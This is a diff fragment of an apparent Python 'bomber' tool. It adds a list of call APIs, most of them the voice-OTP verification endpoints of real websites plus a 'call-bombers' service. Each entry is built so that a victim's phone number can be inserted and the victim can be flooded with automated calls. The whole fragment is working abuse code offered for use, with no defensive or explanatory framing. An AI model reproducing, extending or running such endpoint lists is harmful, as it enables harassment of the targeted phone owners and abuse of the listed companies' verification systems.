@@ -1076,4 +1076,49 @@ apis = [
     "data": None,
     "count": 5
 }
+
+call_apis = [
+    {
+        "url": "https://call-bombers.vercel.app/send-call",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: json.dumps({"key": "Gift By DH Alamin", "number": phone, "repeat": "1"}),
+        "count": 1
+    },
+    {
+        "url": "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{phone}?callType=otpOnCall",
+        "method": "GET",
+        "headers": {},
+        "data": None,
+        "count": 1
+    },
+    {
+        "url": "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"action_id=call_to_otp&mob_num={phone}&member_id=1547045",
+        "count": 1
+    },
+    {
+        "url": "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}",
+        "method": "GET",
+        "headers": {},
+        "data": None,
+        "count": 1
+    },
+    {
+        "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+        "data": lambda phone: f"mobile_number={phone}&method=call&uid=12692588",
+        "count": 1
+    },
+    {
+        "url": "https://torob.com/v4/user/phone/send-voice-otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json"},
+        "data": lambda phone: json.dumps({"phone_number": f"0{phone}"}),
+        "count": 1
+    }
 ]
+
